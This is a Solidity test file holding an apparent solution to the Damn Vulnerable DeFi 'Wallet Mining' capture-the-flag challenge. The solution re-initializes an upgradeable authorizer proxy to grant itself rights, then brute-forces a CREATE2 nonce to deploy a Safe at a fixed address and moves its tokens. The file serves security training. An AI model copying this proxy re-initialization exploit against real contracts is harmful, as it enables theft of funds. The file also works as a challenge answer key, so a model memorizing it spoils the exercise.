// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {
    ICreateX,
    CREATEX_DEPLOYMENT_SIGNER,
    CREATEX_ADDRESS,
    CREATEX_DEPLOYMENT_TX,
    CREATEX_CODEHASH
} from "./CreateX.sol";
import {
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER,
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX,
    SAFE_SINGLETON_FACTORY_ADDRESS,
    SAFE_SINGLETON_FACTORY_CODE
} from "./SafeSingletonFactory.sol";


contract Nothing {
 
    constructor() {
       
    }
}

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        // Deploy Safe Singleton Factory contract using signed transaction
        vm.deal(SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX);
        assertEq(
            SAFE_SINGLETON_FACTORY_ADDRESS.codehash,
            keccak256(SAFE_SINGLETON_FACTORY_CODE),
            "Unexpected Safe Singleton Factory code"
        );

        // Deploy CreateX contract using signed transaction
        vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);
        assertEq(CREATEX_ADDRESS.codehash, CREATEX_CODEHASH, "Unexpected CreateX code");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        AuthorizerFactory authorizerFactory = AuthorizerFactory(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.authorizerfactory")),
                initCode: type(AuthorizerFactory).creationCode
            })
        );
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = WalletDeployer(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.walletdeployer")),
                initCode: bytes.concat(
                    type(WalletDeployer).creationCode,
                    abi.encode(address(token), address(proxyFactory), address(singletonCopy), deployer) // constructor args are appended at the end of creation code
                )
            })
        );

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with initial tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
      Explain the attack and how to solve the challenge:
        The challenge is to deploy a Gnosis Safe wallet at a specific address (USER_DEPOSIT_ADDRESS)
        using the WalletDeployer contract, which requires authorization from the Authorizer contract.
        The player must use the user's private key to sign a transaction from the deployed wallet to transfer
        tokens to the user, while ensuring that the wallet deployer and deposit address end up with zero token balance,
        the user executes no transactions, and the player executes exactly one transaction.
        The vulnerability lies in the fact that the player can manipulate the deployment process and the subsequent
        transaction execution to achieve their goals without proper authorization checks.
     */
    function test_walletMining() public checkSolvedByPlayer {

        //
        address[] memory _wards = new address[](1);
        _wards[0] = player;
        address[] memory _aims = new address[](1);
        _aims[0] = USER_DEPOSIT_ADDRESS;
        authorizer.init(_wards, _aims);
        address[] memory owners = new address[](1);
        owners[0] = user;
        uint256 correctNonce;
        
        // Initialize data for Safe setup
        bytes memory initializer = abi.encodeWithSelector(
            Safe.setup.selector,
            owners,
            1,
            address(0),
            "",
            address(0),
            address(0),
            0,
            payable(0)
        );
        // Compute the creation code hash for the SafeProxy
        bytes memory initCode = abi.encodePacked(
            type(SafeProxy).creationCode,
            abi.encode(address(singletonCopy)) 
        );

        bytes32 creationCodeHash = keccak256(initCode);

        // Brute-force the correct nonce to deploy the SafeProxy at USER_DEPOSIT_ADDRESS
        for (uint256 nonce = 0; nonce < 256; nonce++) {

            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
            address predicted = vm.computeCreate2Address(
                salt,
                creationCodeHash,
                address(walletDeployer.cook())
            );
            if (predicted == USER_DEPOSIT_ADDRESS) {
                correctNonce = nonce;
                break;
            }
        }
        // Deploy the SafeProxy at USER_DEPOSIT_ADDRESS using the WalletDeployer
        bool correct = walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, correctNonce);
        assert(correct); // Drop must succeed
        
        // Prepare transaction data for transferring tokens from Safe to user
        bytes memory transferData = abi.encodeCall(
            token.transfer,
            (user, DEPOSIT_TOKEN_AMOUNT)
        );
        
        // Get the transaction hash for signing
        Safe safeProxy = Safe(payable(USER_DEPOSIT_ADDRESS));
        bytes32 txHash = safeProxy.getTransactionHash(
            address(token),     
            0,                 
            transferData,       
            Enum.Operation.Call, 
            0,                  
            0,                
            0,                  
            address(0),         
            payable(address(0)), 
            0                   
        );
        
        // Sign the transaction hash with user's private key
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        
        // Execute the transaction from the SafeProxy
        safeProxy.execTransaction(
            address(token),    
            0,                  
            transferData,       
            Enum.Operation.Call, 
            0,                  
            0,                 
            0,                  
            address(0),         
            payable(address(0)), 
            signature               
        );

        // Ensure the wallet deployer has zero token balance and ward received the payment
        token.transfer(ward, initialWalletDeployerTokenBalance);

        //Player deploys a Nothing contract to execute a transaction and satisfy the challenge conditions
        Nothing Nothing = new Nothing();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        
        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");

    }
}